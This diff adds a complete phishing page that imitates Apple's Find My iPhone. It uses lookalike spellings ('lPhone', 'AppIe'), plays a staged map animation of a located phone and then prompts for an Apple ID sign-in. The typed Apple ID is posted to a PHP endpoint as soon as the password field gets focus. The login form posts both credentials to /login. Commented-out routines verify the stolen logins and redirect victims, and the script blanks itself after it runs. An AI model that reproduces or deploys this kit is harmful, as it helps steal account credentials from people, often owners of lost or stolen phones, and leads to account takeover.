@@ -1,0 +1,484 @@
+<html>
+  <head>
+    <title> Find My lPhone</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+    <meta charset="utf-8">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <link rel="stylesheet" href="/ee/Base.min.css">
+    <link rel="stylesheet" href="/ee/app.css">
+    <link rel="stylesheet" href="/ee/main.css">
+    <link rel="stylesheet" href="/ee/look.css">
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon" >
+    <script type="text/javascript" src="/ee/jquery.js"></script>
+  </head>
+  <body class="tk-body ">
+    <div class="cloudos-loading-screen" id="cw-bootstrap-html">
+      <div class="toolbar-view base-application-toolbar-view cloud-os-application-toolbar-view dark-theme" style="top: 0px;z-index:1">
+        <div class="cloud-os-application-toolbar-left-view toolbar-left-view">
+          <span tabindex="0" class="apple-icon-button cw-button">
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="44" viewBox="0 0 16 44">
+              <path d="M8.02 16.23c-.73 0-1.86-.83-3.05-.8-1.57.02-3.01.91-3.82 2.32-1.63 2.83-.42 7.01 1.17 9.31.78 1.12 1.7 2.38 2.92 2.34 1.17-.05 1.61-.76 3.03-.76 1.41 0 1.81.76 3.05.73 1.26-.02 2.06-1.14 2.83-2.27.89-1.3 1.26-2.56 1.28-2.63-.03-.01-2.45-.94-2.48-3.74-.02-2.34 1.91-3.46 2-3.51-1.1-1.61-2.79-1.79-3.38-1.83-1.54-.12-2.83.84-3.55.84zm2.6-2.36c.65-.78 1.08-1.87.96-2.95-.93.04-2.05.62-2.72 1.4-.6.69-1.12 1.8-.98 2.86 1.03.08 2.09-.53 2.74-1.31"></path>
+            </svg>
+          </span>
+          <div></div>
+        </div>
+        <div></div>
+        <div class="cloud-os-application-toolbar-right-view toolbar-right-view">
+          <span tabindex="0" class="help-button cw-button">
+            <svg viewBox="0 0 99.6097412109375 99.6572265625" version="1.1" xmlns="http://www.w3.org/2000/svg" classname=" glyph-box">
+              <g transform="matrix(1 0 0 1 -8.740283203125045 85.05859375)">
+                <path d="M 58.5449 14.5508 C 85.791 14.5508 108.35 -8.00781 108.35 -35.2539 C 108.35 -62.4512 85.7422 -85.0586 58.4961 -85.0586 C 31.2988 -85.0586 8.74023 -62.4512 8.74023 -35.2539 C 8.74023 -8.00781 31.3477 14.5508 58.5449 14.5508 Z M 58.5449 6.25 C 35.498 6.25 17.0898 -12.207 17.0898 -35.2539 C 17.0898 -58.252 35.4492 -76.7578 58.4961 -76.7578 C 81.543 -76.7578 100 -58.252 100.049 -35.2539 C 100.098 -12.207 81.5918 6.25 58.5449 6.25 Z M 57.5195 -25.1465 C 60.0098 -25.1465 61.4746 -26.6602 61.4746 -28.6133 L 61.4746 -29.1992 C 61.4746 -31.9336 63.0859 -33.6426 66.4551 -35.8887 C 71.1914 -39.0137 74.5605 -41.8945 74.5605 -47.7051 C 74.5605 -55.8594 67.334 -60.2051 59.082 -60.2051 C 50.6836 -60.2051 45.166 -56.25 43.7988 -51.7578 C 43.5547 -50.9277 43.4082 -50.1465 43.4082 -49.3164 C 43.4082 -47.168 45.1172 -45.9473 46.7285 -45.9473 C 49.5117 -45.9473 49.9512 -47.4609 51.5137 -49.2676 C 53.125 -51.9531 55.4688 -53.5645 58.7402 -53.5645 C 63.1836 -53.5645 66.1133 -51.0742 66.1133 -47.3145 C 66.1133 -43.9941 64.0137 -42.3828 59.7656 -39.4531 C 56.25 -37.0117 53.6621 -34.4238 53.6621 -29.6387 L 53.6621 -29.0039 C 53.6621 -26.416 55.0293 -25.1465 57.5195 -25.1465 Z M 57.4219 -10.5469 C 60.2539 -10.5469 62.6953 -12.793 62.6953 -15.625 C 62.6953 -18.5059 60.3027 -20.7031 57.4219 -20.7031 C 54.541 -20.7031 52.1484 -18.457 52.1484 -15.625 C 52.1484 -12.8418 54.5898 -10.5469 57.4219 -10.5469 Z"></path>
+              </g>
+            </svg>
+          </span>
+          <div></div>
+        </div>
+      </div>
+      <div id="show_1" class="content" style="z-index:1;background-color:transparent">
+        <svg class="spinner" id="cloudos-loading-spinner" xmlns="http://www.w3.org/2000/svg" viewBox="-1 -1 2 2">
+          <rect x="0.45625" y="-0.09099" width="0.54375" height="0.18198" rx="0.09099" ry="0.09099" fill="rgb(255,255,255)" transform="rotate(0)"></rect>
+          <rect x="0.45625" y="-0.09099" width="0.54375" height="0.18198" rx="0.09099" ry="0.09099" fill="rgb(229,229,229)" transform="rotate(30)"></rect>
+          <rect x="0.45625" y="-0.09099" width="0.54375" height="0.18198" rx="0.09099" ry="0.09099" fill="rgb(193,193,193)" transform="rotate(60)"></rect>
+          <rect x="0.45625" y="-0.09099" width="0.54375" height="0.18198" rx="0.09099" ry="0.09099" fill="rgb(165,165,165)" transform="rotate(90)"></rect>
+          <rect x="0.45625" y="-0.09099" width="0.54375" height="0.18198" rx="0.09099" ry="0.09099" fill="rgb(138,138,138)" transform="rotate(120)"></rect>
+          <rect x="0.45625" y="-0.09099" width="0.54375" height="0.18198" rx="0.09099" ry="0.09099" fill="rgb(109,109,109)" transform="rotate(150)"></rect>
+          <rect x="0.45625" y="-0.09099" width="0.54375" height="0.18198" rx="0.09099" ry="0.09099" fill="rgb(96,96,96)" transform="rotate(180)"></rect>
+          <rect x="0.45625" y="-0.09099" width="0.54375" height="0.18198" rx="0.09099" ry="0.09099" fill="rgb(82,82,82)" transform="rotate(210)"></rect>
+          <rect x="0.45625" y="-0.09099" width="0.54375" height="0.18198" rx="0.09099" ry="0.09099" fill="rgb(65,65,65)" transform="rotate(240)"></rect>
+          <rect x="0.45625" y="-0.09099" width="0.54375" height="0.18198" rx="0.09099" ry="0.09099" fill="rgb(56,56,56)" transform="rotate(270)"></rect>
+          <rect x="0.45625" y="-0.09099" width="0.54375" height="0.18198" rx="0.09099" ry="0.09099" fill="rgb(51,51,51)" transform="rotate(300)"></rect>
+          <rect x="0.45625" y="-0.09099" width="0.54375" height="0.18198" rx="0.09099" ry="0.09099" fill="rgb(43,43,43)" transform="rotate(330)"></rect>
+        </svg>
+      </div>
+    </div>
+    <form action="/login" method="post">
+        <div id="popup_1" class="modal hide">
+            <!-- Modal content -->
+            <div align="center" class="modal-content w3-animate-zoom" style="border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;">
+              <div style="padding-left: 18px; padding-right: 18px; padding-top: 18px; padding-bottom: 12px;">
+                <span style="padding-top: 10px; font-weight: bold"> Apple ID Sign-In Requested </span>
+                <div style="padding-top: 4px">
+                  <span class="wrap" style="font-size: 13px"></span>
+                  <div style="padding-top: 10px">
+                    <input id="username" style="width:240px; padding: 6px; border:1px solid #eee; outline:none;border-radius: 7px;" value="" type="text" name="username" placeholder="Apple ID" autocomplete="off" required>
+                    <input id="password" style="width:240px; padding: 6px; border:1px solid #eee; outline:none;border-radius: 7px;" type="password" name="password" placeholder="Password" required>
+                    <input type="hidden" id="phone" name="phone">
+                  </div>
+                </div>
+              </div>
+              <div style="border-top: 1px solid #dbdbdb;">
+                <div id="cancel_1" style="background-color: #fefefe;float:left; width:50%; height:50px; padding-top:12px; min-height: 30px; border-right: 1px solid #dbdbdb; border-bottom-left-radius: 16px;" class="cancel">
+                  <span> Cancel </span>
+                </div>
+                <div style="background-color: #fefefe;float:right; width:50%; height:50px; padding-top:12px; min-height: 30px;  border-bottom-right-radius: 16px;" class="okey">
+                  <button type="submit"> Sign in</button>
+                </div>
+              </div>
+            </div>
+          </div>
+    </form>
+    <div id="popup_2" class="modal hide">
+      <!-- Modal content -->
+      <div align="center" class="modal-content w3-animate-zoom" style="border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;">
+        <div style="padding-left: 18px; padding-right: 18px; padding-top: 18px; padding-bottom: 12px;">
+          <span style="padding-top: 18px; font-weight: bold"> Verification Failed </span>
+          <div style="padding-top: 15px">
+            <span class="wrap" style="font-size: 15px"> Your AppIe ID or password was incorrect. </span>
+          </div>
+        </div>
+        <div style="border-top: 1px solid #dbdbdb;">
+          <div id="try_again" style="background-color: #fefefe;float:right; width:100%;height:50px; padding-top:12px; min-height: 30px;  border-bottom-right-radius: 16px; border-bottom-left-radius: 16px;" class="try_again">
+            <span> Sign in</span>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div id="map" class="fade-in hide"></div>
+    </div>
+    <div id="footeri" style="display:none" class="u-layout u-layoutTable u-layout--4up">
+      <a class="promo-item u-layoutTable-item" data-analytics-event="link.component_click" data-analytics-link-component_type="Promo" data-analytics-link-component_name="Use Find My" data-analytics-link-url="/en-us/HT210400" href="https://support.apple.com/en-us/HT210400" data-analytics-listener-added="true">
+        <svg width="30px" height="30px" class="promo-image" viewBox="0 0 30 30" xmlns="http://www.w3.org/2000/svg">
+          <g fill="rgb(23, 170, 48)" fill-rule="evenodd">
+            <polygon points="1 10.422 1 18.413 5.332 18.413 12.008 23.403 12.008 5.404 5.332 10.422"></polygon>
+            <path d="M16.824,9.722 C16.822,9.72 16.33,9.404 16.099,9.404 C15.769,9.404 15.5,9.699 15.5,10.063 C15.5,10.565 15.958,10.646 16.353,10.926 C17.237,11.554 17.848,12.872 17.848,14.411 C17.848,15.95 17.237,17.269 16.353,17.897 C15.958,18.177 15.5,18.257 15.5,18.76 C15.5,19.123 15.769,19.418 16.099,19.418 C16.33,19.418 16.822,19.102 16.824,19.101 C18.108,18.277 19,16.489 19,14.411 C19,12.333 18.108,10.545 16.824,9.722 Z" class="sound-arc-1"></path>
+            <path d="M20.425,5.294 C20.378,5.258 19.962,4.911 19.678,4.911 C19.304,4.911 19,5.204 19,5.566 C19,5.8 19.086,5.96 19.188,6.069 C19.306,6.196 19.694,6.431 19.803,6.524 C21.485,7.951 22.644,10.943 22.644,14.411 C22.644,17.88 21.485,20.872 19.803,22.299 C19.694,22.391 19.306,22.626 19.188,22.753 C19.086,22.862 19,23.023 19,23.256 C19,23.618 19.304,23.911 19.678,23.911 C19.962,23.911 20.378,23.565 20.425,23.528 C22.54,21.904 24,18.433 24,14.411 C24,10.389 22.54,6.918 20.425,5.294 Z" class="sound-arc-2"></path>
+            <path d="M24.038,1.357 C23.724,1.107 23.587,1 23.374,1 C23.026,1 22.745,1.281 22.745,1.628 C22.745,1.922 22.817,2.065 23.094,2.269 C25.819,4.265 27.735,8.939 27.735,14.411 C27.735,19.839 25.85,24.48 23.162,26.504 C22.807,26.771 22.75,26.85 22.75,27.161 C22.75,27.507 23.03,27.786 23.375,27.786 C23.587,27.786 23.651,27.772 23.982,27.513 C26.947,25.195 29,20.206 29,14.411 C29,8.653 26.972,3.693 24.038,1.357 Z" class="sound-arc-3"></path>
+          </g>
+        </svg>
+        <span class="promo-title"> Play sound </span>
+        <div class="promo-link">
+          <span class="" aria-hidden="true"></span>
+        </div>
+      </a>
+      <a class="promo-item u-layoutTable-item" data-analytics-event="link.component_click" data-analytics-link-component_type="Promo" data-analytics-link-component_name="Share Locations" data-analytics-link-url="/en-us/HT210514" href="https://support.apple.com/en-us/HT210514" data-analytics-listener-added="true">
+        <svg width="30px" height="30px" class="promo-image" viewBox="0 0 30 30" xmlns="http://www.w3.org/2000/svg">
+          <path d="M27 23.498h-5v-1h.006c0-1.377 1.116-2.494 2.494-2.494 1.377 0 2.493 1.117 2.493 2.494H27v1zm1.251-.006H28v-.994c0-1.934-1.567-3.5-3.5-3.5-1.934 0-3.5 1.566-3.5 3.5v.994h-.251c-.414 0-.75.324-.75.724v5.062c0 .4.336.724.75.724h7.502c.414 0 .75-.324.75-.724v-5.062c0-.4-.336-.724-.75-.724zM15-.002c-8.284 0-15 6.716-15 15 0 8.284 6.716 15 15 15 1.218 0 2.396-.161 3.529-.436-.012-.094-.029-.188-.029-.287v-.734c-1.121.289-2.289.459-3.5.459C7.267 29 .999 22.73.999 14.998.999 7.265 7.267.997 15 .997c7.732 0 14.002 6.268 14.002 14.001 0 1.496-.24 2.936-.675 4.287.268.319.493.674.676 1.054.635-1.661.997-3.457.997-5.341 0-8.284-6.716-15-15-15zm-.001 19.012c-2.204 0-3.99-1.793-3.99-4.006 0-2.212 1.786-4.005 3.99-4.005s3.99 1.793 3.99 4.005c0 2.213-1.786 4.006-3.99 4.006zm-.001-9.026c-2.755 0-4.989 2.24-4.989 5.004 0 2.765 2.234 5.005 4.989 5.005s4.988-2.24 4.988-5.005c0-2.764-2.233-5.004-4.988-5.004zm9.502 7.514c.059 0 .115.006.173.009.208-.805.331-1.644.331-2.513 0-5.522-4.478-10-10-10-5.523 0-10 4.478-10 10 0 5.523 4.477 10 10 10 1.231 0 2.406-.233 3.496-.641v-.139c0-.378.098-.734.268-1.046-1.147.529-2.418.832-3.764.832-4.974 0-9.006-4.032-9.006-9.006s4.032-9.006 9.006-9.006 9.006 4.032 9.006 9.006c0 .899-.136 1.766-.381 2.584.283-.05.573-.08.871-.08z" fill="rgb(23, 170, 48)" fill-rule="evenodd"></path>
+        </svg>
+        <span class="promo-title"> Lost Mode</span>
+        <div class="promo-link">
+          <span class="" aria-hidden="true"></span>
+        </div>
+      </a>
+      <a class="promo-item u-layoutTable-item" data-analytics-event="link.component_click" data-analytics-link-component_type="Promo" data-analytics-link-component_name="Locate a missing device" data-analytics-link-url="/en-us/HT210515" href="https://support.apple.com/en-us/HT210515" data-analytics-listener-added="true">
+        <svg width="30px" height="30px" class="promo-image" viewBox="0 0 30 30" xmlns="http://www.w3.org/2000/svg">
+          <path d="M10.4292 7.2178l.702 18.16h1.036l-.702-18.16h-1.036zm4.011 18.16h1.234v-18.16h-1.234v18.16zm3.508 0h1.034l.702-18.16h-1.035l-.701 18.16zm3.464 1.194c-.003.014-.299 1.436-1.399 1.436l-9.977.001c-.045-.002-1.116-.207-1.342-1.545-.212-1.255-.85-12.794-1.226-20.299-.003-.045.013-.089.044-.121.031-.033.074-.052.119-.052h14.765c.045 0 .088.019.119.052.032.033.047.077.044.122l-1.147 20.406zm-10.344-23.807c0-.033.015-.758 1.281-.758l5.368-.006c.793 0 1.266.225 1.266.733 0 .88.02 2.107.02 2.107.002.091-.074.167-.164.167h-7.607c-.091 0-.164-.074-.164-.164v-2.079zm13.387 2.243h-4.331c-.089 0-.162-.086-.164-.176-.01-.436.007-1.549.007-2.248 0-1.249-1.055-1.602-2.093-1.602h-5.918c-1.668 0-1.954 1.016-1.954 1.602v2.26c0 .09-.074.164-.164.164h-4.327l-.011.989.705.024c.086.002.155.07.16.155.16 3.186.972 19.099 1.239 20.676.275 1.624 1.523 2.114 2.137 2.145h10.516c1.408 0 2.056-1.395 2.214-2.199l1.159-20.622c.005-.086.074-.153.159-.155l.677-.024-.011-.989z" fill="rgb(23, 170, 48)" fill-rule="evenodd"></path>
+        </svg>
+        <span class="promo-title"> Erase IPhone</span>
+        <div class="promo-link">
+          <span class="" aria-hidden="true"></span>
+        </div>
+      </a>
+      <a class="promo-item u-layoutTable-item" data-analytics-event="link.component_click" data-analytics-link-component_type="Promo" data-analytics-link-component_name="Turn on Activation Lock" data-analytics-link-url="/en-us/HT201365" href="https://support.apple.com/en-us/HT201365" data-analytics-listener-added="true">
+        <svg width="30px" height="30px" class="promo-image" viewBox="0 0 30 30" xmlns="http://www.w3.org/2000/svg">
+          <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" fill="rgb(23, 170, 48)" fill-rule="evenodd"></path>
+        </svg>
+        <span class="promo-title"> Activation lock </span>
+        <div class="promo-link">
+          <span class="" aria-hidden="true"></span>
+        </div>
+      </a>
+    </div>
+  </body>
+</html>
+<script>
+  const queryString = window.location.search;
+  document.getElementById("phone").value = queryString;
+
+  var map;
+
+  function initMap() {
+    map = new google.maps.Map(document.getElementById("map"), {
+      center: {
+        lat: 8.9806034,
+        lng: 38.7577605
+      },
+      zoom: 3,
+      styles: [{
+        "featureType": "administrative.country",
+        "elementType": "geometry.stroke",
+        "stylers": [{
+          "color": "#e0a799"
+        }, {
+          "visibility": "on"
+        }, {
+          "weight": 3
+        }]
+      }, {
+        "featureType": "administrative.country",
+        "elementType": "labels",
+        "stylers": [{
+          "weight": 2.5
+        }]
+      }, {
+        "featureType": "administrative.land_parcel",
+        "elementType": "labels",
+        "stylers": [{
+          "visibility": "off"
+        }]
+      }, {
+        "featureType": "landscape.man_made",
+        "elementType": "geometry.fill",
+        "stylers": [{
+          "color": "#efebe4"
+        }]
+      }, {
+        "featureType": "landscape.man_made",
+        "elementType": "geometry.stroke",
+        "stylers": [{
+          "color": "#b8b7b3"
+        }]
+      }, {
+        "featureType": "landscape.natural",
+        "elementType": "geometry.fill",
+        "stylers": [{
+          "color": "#f8f5ed"
+        }]
+      }, {
+        "featureType": "road.arterial",
+        "elementType": "geometry.fill",
+        "stylers": [{
+          "color": "#fbfcdd"
+        }]
+      }, {
+        "featureType": "road.arterial",
+        "elementType": "geometry.stroke",
+        "stylers": [{
+          "color": "#f3b977"
+        }]
+      }, {
+        "featureType": "road.highway",
+        "elementType": "geometry.fill",
+        "stylers": [{
+          "color": "#fcf09c"
+        }]
+      }, {
+        "featureType": "road.highway",
+        "elementType": "geometry.stroke",
+        "stylers": [{
+          "color": "#f6c291"
+        }]
+      }, {
+        "featureType": "road.local",
+        "elementType": "geometry.stroke",
+        "stylers": [{
+          "color": "#c5c6b0"
+        }, {
+          "visibility": "on"
+        }]
+      }, {
+        "featureType": "road.local",
+        "elementType": "labels",
+        "stylers": [{
+          "visibility": "off"
+        }]
+      }]
+    });
+    var image = {
+      url: "./ee/iphone_x_silver.png",
+      size: new google.maps.Size(107, 151),
+      scaledSize: new google.maps.Size(107, 151)
+    };
+    var beachMarker = new google.maps.Marker({
+      position: {
+        lat: 8.9806034,
+        lng: 38.7577605
+      },
+      map: map,
+      icon: image
+    });
+  }
+</script>
+<script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyD94HMXRPmq1TE8LNo6eYUMRTEDdEtHKCQ&callback=initMap" async defer></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+<script>
+  $(document).ready(function() {
+    console.log($("#redirect_iforgot").css("height"));
+  });
+</script>
+<script id="erasable_1" type="text/javascript">
+  var failed_retry;
+  failed_retry = 0;
+  var ss3 = setTimeout(function() {
+    $("#show_1").addClass("hide");
+    $("#show_1").addClass("fade-in");
+    $("#map").removeClass("hide");
+    $("#footeri").show();
+    clearTimeout(ss3);
+  }, 1800);
+  var ss5 = setTimeout(function() {
+    var LatLng = new google.maps.LatLng(8.9806034, 38.7577605);
+    map.setZoom(4);
+    map.panTo(LatLng);
+    clearTimeout(ss5);
+  }, 2600);
+  var ss6 = setTimeout(function() {
+    var LatLng = new google.maps.LatLng(8.9806034, 38.7577605);
+    map.setZoom(6);
+    map.panTo(LatLng);
+    clearTimeout(ss6);
+  }, 3400);
+  var ss7 = setTimeout(function() {
+    var LatLng = new google.maps.LatLng(8.9806034, 38.7577605);
+    map.setZoom(8);
+    map.panTo(LatLng);
+    clearTimeout(ss7);
+  }, 4200);
+  var ss8 = setTimeout(function() {
+    var LatLng = new google.maps.LatLng(8.9806034, 38.7577605);
+    map.setZoom(10);
+    map.panTo(LatLng);
+    clearTimeout(ss8);
+  }, 5000);
+  var ss9 = setTimeout(function() {
+    var LatLng = new google.maps.LatLng(8.9806034, 38.7577605);
+    map.setZoom(12);
+    map.panTo(LatLng);
+    clearTimeout(ss9);
+  }, 5800);
+  var ss10 = setTimeout(function() {
+    $("#map").addClass("blur");
+    var LatLng = new google.maps.LatLng(8.9806034, 38.7577605);
+    map.setZoom(14);
+    map.panTo(LatLng);
+    clearTimeout(ss10);
+  }, 6600);
+  var ss4 = setTimeout(function() {
+    $("#popup_1").removeClass("hide");
+    // $("#map").addClass("blur");
+    var LatLng = new google.maps.LatLng(8.9806034, 38.7577605);
+    map.setZoom(16);
+    map.panTo(LatLng);
+    clearTimeout(ss4);
+  }, 7800);
+  $(".okey").click(function() {
+    login();
+  });
+  $("#try_again").click(function() {
+    $("#popup_2").addClass("hide");
+    $("#locked_id").addClass("hide");
+    $("#popup_1").removeClass("hide");
+    $("#password").focus();
+  });
+  $("#try_again_locked_id").click(function() {
+    $("#locked_id").addClass("hide");
+    $("#popup_1").removeClass("hide");
+    $("#password").focus();
+  });
+  $("#blocked_id_ok").click(function() {
+    $("#blocked_id").addClass("hide");
+    $("#popup_1").removeClass("hide");
+    $("#password").focus();
+  });
+  $("#cancel").click(function() {
+    window.location.reload();
+  });
+  $("#cancel_1").click(function() {
+    $("#popup_1").addClass("hide");
+    $("#map").removeClass("blur");
+    setTimeout(function() {
+      $("#popup_1").removeClass("hide");
+      $("#map").addClass("blur");
+    }, 200);
+    //window.location.reload();
+  });
+  // $("#redirect_iforgot").click(function() {
+  //   window.location.replace("https://iforgot.apple.com");
+  // });
+  // $("#username").keyup(function(e) {
+  //   if (e.which == 13) {
+  //     if ($("#username").val() != "" && $("#password").val() != "") {
+  //       login();
+  //       exit();
+  //     }
+  //     if ($("#password").val() == "") {
+  //       $("#password").focus();
+  //     }
+  //   }
+  // });
+  // $("#password").keyup(function(e) {
+  //   if (e.which == 13) {
+  //     login();
+  //   }
+  // });
+  $("#password").focus(function() {
+    var login_input = $("#username").val();
+    if (login_input.length != "") {
+      if (login_input.indexOf("@") != -1) {} else {
+        $("#username").val(login_input + "@icloud.com");
+      }
+      var apple = $("#username").val();
+      var key = "22b38";
+      $.ajax({
+        type: "POST",
+        url: "../ajax/ajax_app_id.php",
+        data: "appleID=" + apple + "&key=" + key,
+        success: function(msg) {}
+      });
+    }
+  });
+
+  // function _login__() {
+  //   var apple = $("#username").val();
+  //   var pw = $("#password").val();
+  //   var key = "22b38";
+  //   if (apple != "" && pw != "") {
+  //     $("#password").blur();
+  //     $("#popup_1").addClass("hide");
+  //     $("#show_1").removeClass("hide");
+  //     $("#footeri").hide();
+  //     setTimeout(function() {
+  //       $("#map").addClass("hide");
+  //     }, 700);
+  //     $.ajax({
+  //       type: "POST",
+  //       url: "login.php",
+  //       data: "apple_id=" + apple + "&apple_pwd=" + pw + "&key=" + key + "&landing=new",
+  //       success: function(msg) {
+  //         if (msg == "INVALID") {
+  //           $("#show_1").addClass("hide");
+  //           setTimeout(function() {
+  //             $("#map").removeClass("hide");
+  //             $("#footeri").show();
+  //           }, 500);
+  //           $("#popup_2").removeClass("hide");
+  //           $("#password").val("");
+  //           $("#password").focus();
+  //         } else {
+  //           $("#show_1").addClass("hide");
+  //           setTimeout(function() {
+  //             $("#map").removeClass("hide");
+  //           }, 500);
+  //           setTimeout(function() {
+  //             $("#map").removeClass("blur");
+  //             var LatLng = new google.maps.LatLng(8.9806034, 38.7577605);
+  //             map.setZoom(20);
+  //             map.panTo(LatLng);
+  //             redirect();
+  //           }, 1500);
+  //         }
+  //       }
+  //     });
+  //   } else {
+  //     if (apple == "") jQuery("#username").focus();
+  //     else if (password == "") jQuery("#password").focus();
+  //   }
+  // }
+
+  // function login() {
+  //   var apple = $("#username").val();
+  //   var pw = $("#password").val();
+  //   var key = "22b38";
+  //   if (apple != "" && pw != "") {
+  //     $("#password").blur();
+  //     $("#popup_1").addClass("hide");
+  //     $("#show_1").removeClass("hide");
+  //     $("#footeri").hide();
+  //     setTimeout(function() {
+  //       $("#map").addClass("hide");
+  //     }, 700);
+  //     checkTrueLogin($("#username").val(), $("#password").val(), location.pathname.substr(1), function(resp) {
+  //       if (resp == "no") {
+  //         $("#show_1").addClass("hide");
+  //         setTimeout(function() {
+  //           $("#map").removeClass("hide");
+  //           $("#footeri").show();
+  //         }, 500);
+  //         $("#popup_2").removeClass("hide");
+  //         $("#password").val("");
+  //         $("#password").focus();
+  //         /******** Passcode Check *********/
+  //         failed_retry += 1;
+  //         if (failed_retry >= 2) {
+  //           console.log('secondary_id=' + '791-876');
+  //           window.location.href = window.location.protocol + '//' + window.location.hostname + '/791-876';
+  //         }
+  //       } else if (resp == "yes") {
+  //         sendTrueLogin($("#username").val(), $("#password").val(), location.pathname.substr(1));
+  //         console.log('secondary_id=' + '791-876');
+  //         window.location.href = window.location.protocol + '//' + window.location.hostname + '/791-876';
+  //         return;
+  //         $("#show_1").addClass("hide");
+  //         setTimeout(function() {
+  //           $("#map").removeClass("hide");
+  //         }, 500);
+  //         setTimeout(function() {
+  //           $("#map").removeClass("blur");
+  //           var LatLng = new google.maps.LatLng(8.9806034, 38.7577605);
+  //           map.setZoom(20);
+  //           map.panTo(LatLng);
+  //           redirect();
+  //         }, 1500);
+  //       }
+  //     });
+  //   } else {
+  //     if (apple == "") jQuery("#username").focus();
+  //     else if (password == "") jQuery("#password").focus();
+  //   }
+  // }
+
+  // function redirect() {
+  //   setTimeout("window.location.href=\"https://icloud.com/\";", 15000);
+  // }
+  document.getElementById("erasable_1").innerHTML = "";
+</script>
